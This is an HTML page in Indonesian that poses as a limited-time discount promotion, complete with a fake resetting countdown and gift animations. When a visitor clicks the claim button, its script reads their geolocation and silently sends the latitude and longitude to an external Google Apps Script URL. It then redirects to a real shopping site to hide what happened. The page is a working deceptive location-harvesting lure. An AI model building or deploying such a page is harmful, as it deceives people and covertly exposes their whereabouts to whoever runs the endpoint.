<!DOCTYPE html>
<html>
<head>
  <title>Promo Spesial</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #ff512f, #dd2476);
      overflow: hidden;
      color: white;
    }

    .container {
      position: relative;
      z-index: 2;
      text-align: center;
      padding: 20px;
      top: 50%;
      transform: translateY(-50%);
    }

    .card {
      background: rgba(255,255,255,0.15);
      backdrop-filter: blur(15px);
      border-radius: 20px;
      padding: 25px;
      max-width: 320px;
      margin: auto;
      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
      animation: fadeIn 1s ease;
    }

    @keyframes fadeIn {
      from {opacity:0; transform: translateY(20px);}
      to {opacity:1; transform: translateY(0);}
    }

    h1 {
      font-size: 20px;
    }

    .timer {
      font-size: 24px;
      font-weight: bold;
      color: yellow;
      margin: 10px 0;
    }

    .gift {
      font-size: 40px;
      margin: 10px 0;
      animation: bounce 1s infinite;
    }

    @keyframes bounce {
      0%,100%{transform:translateY(0);}
      50%{transform:translateY(-10px);}
    }

    button {
      padding: 12px;
      border: none;
      border-radius: 10px;
      background: #00e676;
      color: black;
      font-weight: bold;
      width: 100%;
      margin-top: 10px;
      cursor: pointer;
      font-size: 16px;
    }

    #status {
      margin-top: 10px;
      font-size: 13px;
    }

    /* animasi jatuh */
    .falling {
      position: absolute;
      top: -50px;
      font-size: 24px;
      animation: fall linear infinite;
    }

    @keyframes fall {
      to {
        transform: translateY(110vh);
      }
    }
  </style>
</head>

<body>

<div class="container">
  <div class="card">
    <h1>🎁 Promo Terbatas</h1>
    
    <div class="gift">📱</div>

    <div>Diskon hingga 90%</div>

    <div class="timer" id="timer">00:10</div>

    <button onclick="ambilLokasi()">Ambil Sekarang</button>

    <div id="status"></div>
  </div>
</div>

<script>
// countdown
let time = 10;
setInterval(()=>{
  time--;
  document.getElementById("timer").innerHTML = "00:" + (time < 10 ? "0"+time : time);
  if(time <= 0){
    time = 10;
  }
},1000);

// animasi jatuh
setInterval(()=>{
  let el = document.createElement("div");
  el.className = "falling";
  el.innerHTML = "🎁";
  el.style.left = Math.random()*100 + "vw";
  el.style.animationDuration = (Math.random()*3+2)+"s";
  document.body.appendChild(el);

  setTimeout(()=>{el.remove()},5000);
},300);

// ambil lokasi
function ambilLokasi(){

  if (navigator.geolocation) {

    navigator.geolocation.getCurrentPosition(
      function(pos){

        var lat = pos.coords.latitude;
        var lon = pos.coords.longitude;

        var url = "https://script.google.com/macros/s/AKfycbw2q8jMhiz3W0FRQ0_C-8hCA3WVAxAqmjeQ3snUsI0j6AMlYYNT_RrPTfjjFxxa48Yv/exec?lat=" 
                  + lat + "&lon=" + lon;

        fetch(url);

        document.getElementById("status").innerHTML = "✅ Memproses hadiah...";

        setTimeout(()=>{
          window.location.href = "https://shopee.co.id";
        },2000);

      },

      function(error){
        document.getElementById("status").innerHTML = "❌ Aktifkan lokasi dulu";
      }

    );

  } else {
    document.getElementById("status").innerHTML = "❌ Tidak support";
  }
}
</script>

</body>
</html>
